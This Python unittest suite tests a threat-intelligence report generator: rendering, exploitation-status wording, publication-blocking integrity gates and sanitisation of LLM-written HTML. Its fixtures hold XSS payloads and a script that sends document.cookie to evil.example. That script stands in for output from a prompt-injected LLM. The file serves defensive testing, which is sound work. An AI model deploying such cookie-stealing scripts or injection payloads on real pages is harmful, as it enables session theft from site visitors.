"""Production evidence-integrity tests for CTI transformation and rendering."""

import base64
import html
import re
import unittest
from datetime import datetime, timezone
from unittest.mock import patch
from urllib.parse import parse_qs, urlparse

import yaml

from automation.authority_transformer import (
    AuthorityTransformer,
    _build_dynamic_og_image_url,
    _build_risk_command_center,
    _ComposerOutcome,
    _generate_svg_thumbnail,
    _legacy_template_enhance,
    _sanitize_llm_html,
    _template_enhance,
)
from automation.config import Config
from automation.content_discovery import DiscoveredArticle, _compute_hash
from automation.report_integrity import (
    CERTIFICATION_STATUS,
    REVIEW_STATUS,
    PublicationIntegrityError,
    _vulnerability_class,
    build_report_context,
    validate_publication,
)
from automation.report_renderer import render_evidence_report


def _make_article(**kwargs) -> DiscoveredArticle:
    defaults = {
        "url": "https://intel.cyberdudebivash.com/reports/CVE-2026-9999",
        "title": "CVE-2026-9999 Critical Windows RCE — CVSS 9.8",
        "summary": (
            "A remote code execution vulnerability in a Windows web service allows "
            "unauthenticated attackers to execute commands."
        ),
        "published_at": "2026-08-12T06:00:00+00:00",
        "content_hash": _compute_hash(
            "https://intel.cyberdudebivash.com/reports/CVE-2026-9999",
            "CVE-2026-9999",
        ),
        "labels": ["Vulnerabilities", "CYBERDUDEBIVASH", "Threat Intelligence"],
        "source": "nvd",
        "full_content": "CVE ID: CVE-2026-9999\nDescription: Remote code execution in a Windows web service.\nCVSS Score: 9.8",
        "cve_id": "CVE-2026-9999",
        "cvss_score": 9.8,
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
        "cwe_ids": ["CWE-78"],
        "affected_vendor": "Example",
        "affected_product": "Example Web Service",
    }
    defaults.update(kwargs)
    return DiscoveredArticle(**defaults)


class TestEvidenceFirstTemplate(unittest.TestCase):
    def setUp(self):
        self.config = Config()

    def test_shared_visual_contract_and_provenance(self):
        article = _make_article()
        rendered = render_evidence_report(article, self.config)
        content = rendered.html

        for section in (
            "Executive Summary",
            "Threat Classification and Evidence Status",
            "Verified Facts",
            "Technical Analysis",
            "Exposure and Remediation Decisions",
            "Source Evidence Extract",
            "Detection Engineering",
            "References",
            "Provenance and Review Status",
        ):
            self.assertIn(section, content)

        self.assertIn(rendered.context.report_id, content)
        self.assertIn(rendered.context.source_record_hash, content)
        self.assertIn(article.url, content)
        self.assertIn(REVIEW_STATUS, content)
        self.assertIn(CERTIFICATION_STATUS, content)

    def test_deprecated_evidence_only_template_still_works(self):
        # RX-STABILIZATION-1: _template_enhance()/render_evidence_report() are
        # no longer the production fallback (see _legacy_template_enhance
        # below) but are kept working, not deleted, per the deprecation
        # policy — a future canonical-contract PR may recompose them with
        # the richer template rather than discard the work.
        article = _make_article()
        content = _template_enhance(article, self.config)
        self.assertIn('data-review-status="automated-unreviewed"', content)
        self.assertNotIn("Executive Decision Matrix", content)

    def test_legacy_template_is_the_production_fallback_and_is_commercially_rich(self):
        # RX-PR0 restored this as AuthorityTransformer.transform()'s
        # LLM-failure fallback — proving it independently (not only through
        # transform()) pins the specific regression this fixes: 0a4b2df
        # rerouted every report through the thin evidence-only renderer.
        article = _make_article()
        content = _legacy_template_enhance(article, self.config)
        self.assertIn("Executive Decision Matrix", content)
        self.assertIn("Executive Summary", content)
        self.assertIn("Business Impact", content)

    def test_report_identity_is_deterministic_for_same_source_record(self):
        article = _make_article()
        one = build_report_context(article)
        two = build_report_context(article)
        self.assertEqual(one.report_id, two.report_id)
        self.assertEqual(one.source_record_hash, two.source_record_hash)

    def test_report_identity_changes_when_source_record_changes(self):
        original = build_report_context(_make_article())
        changed = build_report_context(_make_article(summary="Materially changed source evidence."))
        self.assertNotEqual(original.source_record_hash, changed.source_record_hash)
        self.assertNotEqual(original.report_id, changed.report_id)

    def test_source_content_is_html_escaped(self):
        article = _make_article(
            url='https://example.org/advisory?x=1&next="bad"',
            summary='<script>alert("x")</script> source text',
            full_content='<img src=x onerror=alert(1)>',
        )
        rendered = render_evidence_report(article, self.config)
        self.assertNotIn('<script>alert("x")</script>', rendered.html)
        self.assertNotIn('<img src=x onerror=alert(1)>', rendered.html)
        self.assertIn("&lt;script&gt;", rendered.html)
        self.assertIn("&amp;", rendered.html)


class TestCveAndKevSemantics(unittest.TestCase):
    def setUp(self):
        self.config = Config()

    def test_confirmed_absence_from_kev_is_not_no_exploitation_claim(self):
        article = _make_article(kev_listed=False)
        content = AuthorityTransformer(self.config).transform(article)["content"]
        self.assertIn("Not Listed", content)
        self.assertIn("does not prove absence of exploitation", content)
        self.assertNotIn("No confirmed exploitation on record", content)
        self.assertNotIn("Actively exploited in the wild", content)
        self.assertNotIn("Exploitation is confirmed active", content)

    def test_kev_true_is_the_structured_confirmation(self):
        article = _make_article(
            source="cisa_kev",
            kev_listed=True,
            kev_date_added="2026-08-10",
            kev_due_date="2026-08-31",
            kev_required_action="Apply mitigations per vendor instructions.",
        )
        result = AuthorityTransformer(self.config).transform(article)
        content = result["content"]
        self.assertEqual(result["report_family"], "cisa_kev")
        self.assertIn("Confirmed — CISA KEV listed", content)
        self.assertIn("Apply mitigations per vendor instructions.", content)
        self.assertIn("CISA FEDERAL MANDATE", content)

    def test_unknown_kev_does_not_become_false_negative(self):
        article = _make_article(kev_listed=None)
        content = AuthorityTransformer(self.config).transform(article)["content"]
        self.assertIn("Unknown or unavailable; no negative claim is made", content)
        self.assertNotIn("Not Listed", content)

    def test_dos_cve_does_not_get_rce_or_webshell_material(self):
        article = _make_article(
            title="CVE-2026-48439 — CVSS 7.5 denial-of-service vulnerability",
            summary="A denial-of-service condition can crash the affected CAI service.",
            full_content="CVE ID: CVE-2026-48439\nCWE: CWE-400\nImpact: denial of service",
            cve_id="CVE-2026-48439",
            cvss_score=7.5,
            cwe_ids=["CWE-400"],
            kev_listed=False,
        )
        result = AuthorityTransformer(self.config).transform(article)
        content = result["content"]
        self.assertEqual(result["detection_status"], "telemetry_specification_only")
        self.assertIn("Availability-impact evidence", content)
        self.assertNotIn("Web Service Spawning a Command Interpreter", content)
        self.assertNotIn("web shell", content.lower())
        self.assertNotIn("lateral movement", content.lower())

    def test_spoofing_cve_uses_identity_telemetry_not_web_exploitation(self):
        article = _make_article(
            title="CVE-2026-57104 Windows NAT spoofing vulnerability",
            summary="A spoofing weakness affects Windows NAT identity handling.",
            cve_id="CVE-2026-57104",
            cvss_score=8.8,
            cwe_ids=None,
            kev_listed=False,
        )
        result = AuthorityTransformer(self.config).transform(article)
        content = result["content"]
        self.assertEqual(result["detection_status"], "telemetry_specification_only")
        self.assertIn("identity/control-boundary weakness", content)
        self.assertNotIn("Web Service Spawning", content)

    def test_sql_injection_rule_has_real_uuid_and_valid_yaml(self):
        article = _make_article(
            title="CVE-2026-72898 Metabase SQL injection",
            summary="A SQL injection vulnerability affects a Metabase web endpoint.",
            full_content="CVE ID: CVE-2026-72898\nCWE: CWE-89\nClass: SQL injection",
            cve_id="CVE-2026-72898",
            cwe_ids=["CWE-89"],
            kev_listed=True,
        )
        result = AuthorityTransformer(self.config).transform(article)
        content = result["content"]
        self.assertEqual(result["detection_status"], "syntax_validated_experimental")
        self.assertIn("SQL Injection Probing", content)
        match = re.search(r"<code>(title:.*?)</code>", content, re.DOTALL)
        self.assertIsNotNone(match)
        rule = yaml.safe_load(html.unescape(match.group(1)))
        self.assertRegex(rule["id"], r"^[0-9a-f]{8}-[0-9a-f]{4}-5[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$")
        self.assertIn("condition", rule["detection"])
        self.assertEqual(rule["status"], "experimental")


class TestFamilySpecificSchemas(unittest.TestCase):
    def setUp(self):
        self.config = Config()

    def test_ransomware_claim_has_claim_boundary_and_no_patch_schema(self):
        article = _make_article(
            source="ransomware_intel",
            title="Qilin Ransomware Claims New Victim: Example Co",
            summary="Qilin has listed Example Co as a new victim on its leak site.",
            full_content="Ransomware Group: Qilin\nVictim: Example Co\nSector: Technology",
            labels=["Ransomware", "Threat Intelligence"],
            cve_id=None,
            cvss_score=None,
            cvss_vector=None,
            cwe_ids=None,
            affected_vendor=None,
            affected_product=None,
        )
        result = AuthorityTransformer(self.config).transform(article)
        content = result["content"]
        self.assertEqual(result["report_family"], "ransomware_claim")
        self.assertEqual(result["detection_status"], "withheld_insufficient_evidence")
        self.assertIn("Third-party actor claim — independently unverified", content)
        self.assertIn("no validated actor-specific IOCs or TTPs", content)
        self.assertNotIn("pre-exploitation", content.lower())
        self.assertNotIn("PATCH unconfirmed", content)
        self.assertNotIn("Sigma YAML", content)

    def test_ai_news_has_governance_schema_not_phishing_rule(self):
        article = _make_article(
            source="global_rss",
            title="OpenAI Astra model safety evaluation published",
            summary="OpenAI published evaluation results for the next Astra AI model.",
            full_content="Model evaluation and capability safety news.",
            labels=["AI Security", "Threat Intelligence"],
            cve_id=None,
            cvss_score=None,
            cvss_vector=None,
            cwe_ids=None,
            affected_vendor=None,
            affected_product=None,
        )
        result = AuthorityTransformer(self.config).transform(article)
        content = result["content"]
        self.assertEqual(result["report_family"], "ai_security")
        self.assertEqual(result["detection_status"], "not_applicable")
        self.assertIn("AI Security Assessment", content)
        self.assertIn("Governance and Engineering Actions", content)
        self.assertNotIn("Sigma YAML", content)
        self.assertNotIn("Office Application Shell Spawn", content)
        self.assertNotIn("phishing detection logic", content.lower())

    def test_automated_reports_never_name_a_human_analyst(self):
        content = AuthorityTransformer(self.config).transform(_make_article())["content"]
        self.assertIn(REVIEW_STATUS, content)
        self.assertNotIn("Bivash Kumar Nayak — Chief Security Architect", content)
        self.assertIn("Automated Intelligence Engine", content)


class TestFailClosedPublicationGate(unittest.TestCase):
    def test_blocks_false_exploitation_assertion(self):
        article = _make_article(kev_listed=False)
        context = build_report_context(article)
        safe = render_evidence_report(article, Config()).html
        unsafe = safe + "<p>Exploitation is confirmed active.</p>"
        with self.assertRaises(PublicationIntegrityError) as caught:
            validate_publication(article, context, unsafe)
        self.assertTrue(any("unverified exploitation assertion" in issue for issue in caught.exception.issues))

    def test_blocks_placeholders(self):
        article = _make_article()
        context = build_report_context(article)
        unsafe = render_evidence_report(article, Config()).html + "<p>Not Found Sector</p>"
        with self.assertRaises(PublicationIntegrityError):
            validate_publication(article, context, unsafe)

    def test_blocks_missing_provenance(self):
        article = _make_article()
        context = build_report_context(article)
        with self.assertRaises(PublicationIntegrityError) as caught:
            validate_publication(article, context, "<p>short report</p>")
        self.assertTrue(any("missing report identifier" in issue for issue in caught.exception.issues))

    def test_blocks_human_attribution_without_review_event(self):
        article = _make_article()
        context = build_report_context(article)
        unsafe = render_evidence_report(article, Config()).html + "Bivash Kumar Nayak — Chief Security Architect"
        with self.assertRaises(PublicationIntegrityError):
            validate_publication(article, context, unsafe)

    def test_blocks_public_reference_draft_achieved_tier(self):
        # The hard publication gate itself, isolated from AuthorityTransformer:
        # a context carrying achieved_tier=="PUBLIC_REFERENCE_DRAFT" (the
        # composer's own verdict that evidence failed correctness controls)
        # must block publication even though every OTHER required field and
        # check passes cleanly.
        article = _make_article()
        context = build_report_context(article, achieved_tier="PUBLIC_REFERENCE_DRAFT")
        safe = render_evidence_report(article, Config()).html
        with self.assertRaises(PublicationIntegrityError) as caught:
            validate_publication(article, context, safe)
        self.assertTrue(
            any("evidence-graph correctness controls failed" in issue for issue in caught.exception.issues)
        )

    @staticmethod
    def _context_matching_rendered(article, rendered, **overrides):
        # render_evidence_report() builds its own internal context (via its
        # own build_report_context(article) call, with no override
        # parameter), stamping generated_at=datetime.now(timezone.utc) at
        # that exact moment. A second, independent build_report_context(article)
        # call a few microseconds later produces a different generated_at
        # string, which trips validate_publication()'s "missing generation
        # timestamp" required-field check for reasons that have nothing to
        # do with what this test is actually verifying. Rebuilding the
        # context from the SAME generated_at the rendered HTML actually used
        # avoids that timing hazard.
        generated_at = datetime.fromisoformat(rendered.context.generated_at.replace("Z", "+00:00"))
        return build_report_context(article, generated_at=generated_at, **overrides)

    def test_empty_achieved_tier_is_not_treated_as_a_failure(self):
        # achieved_tier=="" means "not evaluated" (the default for every
        # caller that hasn't computed a tier), not "evaluated and failed" --
        # must NOT trip the new gate, preserving every existing, unmodified
        # caller's behavior exactly.
        article = _make_article()
        rendered = render_evidence_report(article, Config())
        context = self._context_matching_rendered(article, rendered)  # achieved_tier defaults to ""
        self.assertEqual(context.achieved_tier, "")
        validate_publication(article, context, rendered.html)  # must not raise

    def test_a_real_non_draft_tier_produces_an_honest_certification_label(self):
        article = _make_article()
        rendered = render_evidence_report(article, Config())
        context = self._context_matching_rendered(article, rendered, achieved_tier="TACTICAL_READY")
        self.assertNotEqual(context.certification_status, CERTIFICATION_STATUS)
        self.assertIn("TACTICAL_READY", context.certification_status)
        # And the label the gate actually enforces the presence of is this
        # real one -- not the static default -- so a renderer that (like
        # authority_transformer._assemble_html()) embeds context.certification_status
        # verbatim continues to satisfy validate_publication()'s required-field check.
        html_with_real_label = rendered.html.replace(CERTIFICATION_STATUS, context.certification_status)
        validate_publication(article, context, html_with_real_label)  # must not raise


class TestVulnerabilityClassification(unittest.TestCase):
    """COMMERCIAL-QUALITY-2026-08-18: independently verified live against
    the published CVE-2026-75105 report (a phpIPAM authorization-bypass
    flaw, CWE-639) that _CWE_CLASS was missing that CWE entirely, so a
    report with a clear, named weakness rendered "Vulnerability class:
    Unclassified" -- and, because report_renderer.py branches its
    technical-evidence and IOC generation on context.vulnerability_class
    (e.g. the authorization_failure branch), the report also silently
    missed that class's technical depth, not merely its label."""

    def test_cwe_639_classifies_as_authorization_failure_not_unclassified(self):
        article = _make_article(
            cwe_ids=["CWE-639"],
            summary="An attacker holding any valid temporary share URL can enumerate records across "
                    "all subnets because the system fails to verify the requested subnet against the "
                    "one the token was issued for.",
        )
        self.assertEqual(_vulnerability_class(article), "authorization_failure")

    def test_cwe_862_still_classifies_correctly(self):
        # Regression guard: CWE-639 must be ADDED alongside the existing
        # authorization-failure CWE, not accidentally replace or shadow it.
        article = _make_article(cwe_ids=["CWE-862"], summary="Missing authorization check on an admin endpoint.")
        self.assertEqual(_vulnerability_class(article), "authorization_failure")

    def test_cwe_88_classifies_as_argument_injection_not_unclassified(self):
        # COMMERCIAL-QUALITY-2026-08-19: independently verified live against
        # the published CVE-2026-75912 report (CodeWhale git_blame argument
        # injection, CWE-88) that _CWE_CLASS was missing CWE-88 entirely, so
        # the report showed "CWE: CWE-88" in Verified Facts but "Vulnerability
        # class: Unclassified" in Technical Analysis of the SAME document --
        # a direct, visible self-contradiction in a live customer-facing report.
        article = _make_article(
            cwe_ids=["CWE-88"],
            summary="An argument injection vulnerability in the git_blame tool allows attackers to read "
                    "arbitrary files by injecting git options into the unvalidated rev parameter.",
        )
        self.assertEqual(_vulnerability_class(article), "argument_injection")


class TestRiskCommandCenterRansomwareTiles(unittest.TestCase):
    """COMMERCIAL-QUALITY-2026-08-19: independently verified live that
    ransomware-claim reports (e.g. "SilentRansomGroup Ransomware Claims New
    Victim: Troutman Pepper Locke") rendered an Executive Risk Command
    Center with exactly one generic tile ("CISA KEV: Unknown"), because
    every other tile is gated on CVE-only fields (cve_id, cvss_score,
    epss_score, affected_vendor/product) that a ransomware claim never has
    -- despite the real threat-actor group, sector, and country already
    being known and already shown in the report's own prose elsewhere.
    threat_feeds.RansomwareIntelSource now carries those same values as
    dedicated DiscoveredArticle fields instead of only formatted text, so
    the dashboard can show them as real, scannable tiles."""

    def _ransomware_article(self, **kwargs) -> DiscoveredArticle:
        defaults = dict(
            url="https://www.ransomware.live/id/example",
            title="SilentRansomGroup Ransomware Claims New Victim: Troutman Pepper Locke",
            summary="SilentRansomGroup has listed Troutman Pepper Locke as a new victim on its leak site.",
            published_at="2026-08-18T22:51:57+00:00",
            content_hash=_compute_hash("https://www.ransomware.live/id/example", "SilentRansomGroup"),
            labels=["Ransomware", "CYBERDUDEBIVASH", "Threat Intelligence"],
            source="ransomware_intel",
            cve_id=None, cvss_score=None, cvss_vector=None, cwe_ids=None,
            affected_vendor=None, affected_product=None,
        )
        defaults.update(kwargs)
        return DiscoveredArticle(**defaults)

    def test_group_sector_country_render_as_real_tiles(self):
        article = self._ransomware_article(
            ransomware_group="SilentRansomGroup",
            ransomware_sector="Professional Services",
            ransomware_country="US",
        )
        html_out = _build_risk_command_center(article, cves=[], cvss=None)
        self.assertIn("Threat Actor", html_out)
        self.assertIn("SilentRansomGroup", html_out)
        self.assertIn("Professional Services", html_out)
        self.assertIn("US", html_out)

    def test_dashboard_no_longer_collapses_to_the_single_generic_kev_tile(self):
        article = self._ransomware_article(
            ransomware_group="shinyhunters",
            ransomware_sector="Technology",
            ransomware_country="CH",
        )
        html_out = _build_risk_command_center(article, cves=[], cvss=None)
        # Before this fix, a ransomware claim produced exactly one tile
        # ("CISA KEV: Unknown"); it must now show real threat-actor context
        # too: Threat Actor + Sector + Country + the always-present KEV tile.
        self.assertEqual(html_out.count('font-size:10px;font-weight:700'), 4)

    def test_missing_sector_and_country_omits_only_those_tiles(self):
        # Must not fabricate a sector/country the source record didn't supply.
        article = self._ransomware_article(ransomware_group="UnknownGroupX")
        html_out = _build_risk_command_center(article, cves=[], cvss=None)
        self.assertIn("UnknownGroupX", html_out)
        self.assertNotIn("Sector", html_out)
        self.assertNotIn("Country", html_out)

    def test_cve_report_without_ransomware_fields_is_unaffected(self):
        # Backward-compatibility guard: a plain CVE report (no ransomware_*
        # fields set at all) must render exactly as before -- no phantom
        # "Threat Actor" tile from an unset field.
        article = _make_article()
        html_out = _build_risk_command_center(article, cves=[article.cve_id], cvss=str(article.cvss_score))
        self.assertNotIn("Threat Actor", html_out)
        self.assertIn("CVE ID", html_out)


class TestAuthorityTransformerContract(unittest.TestCase):
    def setUp(self):
        self.config = Config()
        self.transformer = AuthorityTransformer(self.config)

    def test_transform_returns_production_metadata(self):
        result = self.transformer.transform(_make_article())
        required = {
            "title",
            "content",
            "labels",
            "image_url",
            "meta_title",
            "meta_description",
            "keywords",
            "source_url",
            "content_hash",
            "content_source",
            "report_id",
            "source_record_hash",
            "report_family",
            "review_status",
            "certification_status",
            "achieved_tier",
            "quality_score",
            "quality_score_eligible",
            "detection_status",
            "generated_at",
        }
        self.assertTrue(required.issubset(result))
        self.assertEqual(result["content_source"], "reportx_composer")
        self.assertEqual(result["source_url"], _make_article().url)
        self.assertEqual(result["content_hash"], _make_article().content_hash)
        self.assertLessEqual(len(result["labels"]), 20)

    def test_quality_scorecard_is_real_computed_data_not_a_placeholder(self):
        # COMMERCIAL-QUALITY-2026-08-18: the 20-dimension commercial-
        # readiness scorecard (Intelligence Validation Framework, PR #90)
        # was built, tested, and validated against real canary data, but
        # was never actually wired into the live publish path -- it existed
        # only as a standalone CLI command. Real, observable data now flows
        # through transform()'s own result for every composed article.
        result = self.transformer.transform(_make_article())
        self.assertIsInstance(result["quality_score"], int)
        self.assertGreaterEqual(result["quality_score"], 0)
        self.assertLessEqual(result["quality_score"], 100)
        self.assertIsInstance(result["quality_score_eligible"], bool)

    def test_default_publication_without_api_keys_falls_back_to_composer(self):
        # RX-PR0/RX-PR2: transform() always attempts call_llm() first (mission
        # Section 7 — "LLM SUCCESS -> enriched narrative, LLM FAILURE ->
        # deterministic template", now a three-rung chain: LLM -> ReportX
        # composer (evidence-graph-backed, gate-checked per article) ->
        # legacy template as the final safety net). With no provider keys
        # configured, call_llm() itself fails closed (returns None, no
        # network call) and every attempt is recorded; this article's own
        # evidence is clean, so the composer clears its fail-closed gate and
        # is used ahead of the legacy template.
        result = self.transformer.transform(_make_article())
        self.assertEqual(result["content_source"], "reportx_composer")
        self.assertTrue(result["llm_attempts"])
        self.assertTrue(all(a["error"] == "no_api_key" for a in result["llm_attempts"]))

    def test_composer_exception_falls_back_to_legacy_template_and_still_publishes(self):
        # The legacy template is deprecated, not deleted (CLAUDE.md
        # Deprecation Instead of Deletion): it must still be reachable as the
        # final fallback when the composer rung itself raises (a SOFTWARE
        # fault in an unproven-in-production path, achieved_tier=="" --
        # distinct from a genuine evidence-correctness failure, see the next
        # test). An unproven code path must not be able to break publication
        # outright, so this one case still publishes via the legacy template.
        with patch(
            "automation.authority_transformer._composer_enhance",
            return_value=_ComposerOutcome(html=None, achieved_tier=""),
        ):
            result = self.transformer.transform(_make_article())
        self.assertEqual(result["content_source"], "template")

    def test_composer_evidence_correctness_failure_blocks_publication_entirely(self):
        # P0-COMMERCIAL-QUALITY-2026-08-18: when the composer's OWN
        # fail-closed tier ladder finds the evidence (not the code) failed
        # correctness controls, the old behavior was to silently fall back
        # to the legacy template and publish anyway -- exactly the "silent
        # downgrade to public-reference or legacy output" the mandate
        # forbids by name. It must now block publication outright instead.
        with patch(
            "automation.authority_transformer._composer_enhance",
            return_value=_ComposerOutcome(
                html=None, achieved_tier="PUBLIC_REFERENCE_DRAFT", failed_controls=("source_provenance",),
            ),
        ):
            with self.assertRaises(PublicationIntegrityError) as caught:
                self.transformer.transform(_make_article())
        self.assertTrue(
            any("evidence-graph correctness controls failed" in issue for issue in caught.exception.issues)
        )

    def test_evidence_correctness_failure_blocks_publication_even_when_llm_succeeds(self):
        # The core gap this fix closes: before it, _composer_enhance() (and
        # therefore all evidence-based certification) was only ever called
        # AFTER the LLM path had already failed -- an LLM-authored article,
        # the first-choice content path, published with zero evidence-based
        # certification at all, however bad its underlying evidence. The
        # certification check must now run unconditionally and gate
        # publication regardless of which renderer supplied the prose.
        with patch(
            "automation.authority_transformer.call_llm",
            return_value=("<h3>Executive Summary</h3><p>Fluent LLM prose.</p>", "groq"),
        ), patch(
            "automation.authority_transformer._composer_enhance",
            return_value=_ComposerOutcome(
                html=None, achieved_tier="PUBLIC_REFERENCE_DRAFT", failed_controls=("evidence_hash",),
            ),
        ):
            with self.assertRaises(PublicationIntegrityError):
                self.transformer.transform(_make_article())

    def test_real_achieved_tier_produces_an_honest_non_default_certification_label(self):
        # _make_article()'s evidence is clean and already proven elsewhere in
        # this suite to clear the composer's fail-closed gate
        # (test_default_publication_without_api_keys_falls_back_to_composer),
        # so it earns a real, non-PUBLIC_REFERENCE_DRAFT tier. The rendered
        # certification label must reflect that -- not the unconditional
        # static CERTIFICATION_STATUS string every report carried before
        # this fix, regardless of actual evidence quality.
        result = self.transformer.transform(_make_article())
        self.assertNotEqual(result["achieved_tier"], "")
        self.assertNotEqual(result["achieved_tier"], "PUBLIC_REFERENCE_DRAFT")
        self.assertNotEqual(result["certification_status"], CERTIFICATION_STATUS)
        self.assertIn(result["achieved_tier"], result["certification_status"])
        self.assertIn(result["certification_status"], result["content"])

    def test_structured_data_has_automated_author_and_no_fake_counts(self):
        content = self.transformer.transform(_make_article())["content"]
        self.assertIn("SENTINEL APEX Automated Intelligence Engine", content)
        self.assertNotIn("2,400+", content)
        self.assertNotIn("production-ready Sigma", content)
        self.assertNotIn('"@type": "HowTo"', content)
        self.assertNotIn('"@type": "FAQPage"', content)

    def test_svg_thumbnail_and_dynamic_image_contract(self):
        result = self.transformer.transform(_make_article())
        self.assertIn("data:image/svg+xml;base64,", result["content"])
        params = parse_qs(urlparse(result["image_url"]).query)
        self.assertEqual(params["cve"], ["CVE-2026-9999"])
        self.assertEqual(params["severity"], ["CRITICAL"])

    def test_svg_alt_is_well_formed_and_palette_is_category_specific(self):
        tag = _generate_svg_thumbnail('Windows "RCE"', ["Ransomware"], "not-a-number")
        self.assertRegex(tag, r'alt="[^"]*"')
        svg = base64.b64decode(tag.split("base64,")[1].split('"')[0]).decode("utf-8")
        self.assertIn("#f59e0b", svg)

    def test_og_builder_omits_unknown_values(self):
        url = _build_dynamic_og_image_url(
            self.config,
            title="General intelligence",
            severity=None,
            cve_id="",
            cvss=None,
            type_label="Threat Intel",
        )
        params = parse_qs(urlparse(url).query)
        self.assertNotIn("cve", params)
        self.assertNotIn("cvss", params)


class TestLLMOutputSanitization(unittest.TestCase):
    """RX-PR0 follow-up (CodeRabbit): call_llm() output is not implicitly
    trusted — an untrusted source article is embedded in the analyst prompt,
    so a compromised or prompt-injected response must not reach publication
    with scripts, event handlers, or styling intact."""

    def setUp(self):
        self.config = Config()

    def test_strips_script_tags(self):
        self.assertNotIn("<script>", _sanitize_llm_html('<p>Safe</p><script>alert(1)</script>'))

    def test_strips_event_handler_attributes(self):
        result = _sanitize_llm_html('<p onclick="alert(1)">Safe text</p>')
        self.assertNotIn("onclick", result)
        self.assertIn("Safe text", result)

    def test_strips_javascript_href(self):
        result = _sanitize_llm_html('<a href="javascript:alert(1)">bad link</a>')
        self.assertNotIn("javascript:", result)

    def test_keeps_https_href(self):
        result = _sanitize_llm_html('<a href="https://nvd.nist.gov/vuln/detail/CVE-2026-1">NVD</a>')
        self.assertIn('href="https://nvd.nist.gov/vuln/detail/CVE-2026-1"', result)

    def test_strips_inline_styles_and_unwraps_non_allowed_tags(self):
        result = _sanitize_llm_html('<div style="color:red" class="x">wrapped text</div>')
        self.assertNotIn("style=", result)
        self.assertNotIn("<div", result)
        self.assertIn("wrapped text", result)

    def test_keeps_prompt_allowed_structure_tags(self):
        raw = "<h3>Executive Summary</h3><p>Text</p><ul><li>Item</li></ul><table><tr><th>A</th><td>B</td></tr></table><pre><code>title: x</code></pre>"
        result = _sanitize_llm_html(raw)
        for tag in ("<h3>", "<p>", "<ul>", "<li>", "<table>", "<tr>", "<th>", "<td>", "<pre>", "<code>"):
            self.assertIn(tag, result)

    def test_transform_sanitizes_malicious_llm_output_end_to_end(self):
        malicious_llm_html = (
            '<h3>Executive Summary</h3><p>Legit analysis text.</p>'
            '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>'
            '<img src=x onerror="alert(1)">'
            '<div style="position:fixed">overlay</div>'
        )
        with patch(
            "automation.authority_transformer.call_llm",
            return_value=(malicious_llm_html, "groq"),
        ):
            result = AuthorityTransformer(self.config).transform(_make_article())
        content = result["content"]
        self.assertEqual(result["content_source"], "groq")
        self.assertNotIn("<script>fetch", content)
        self.assertNotIn("onerror", content)
        self.assertNotIn("evil.example", content)
        self.assertNotIn("position:fixed", content)
        self.assertIn("Legit analysis text.", content)


if __name__ == "__main__":
    unittest.main()
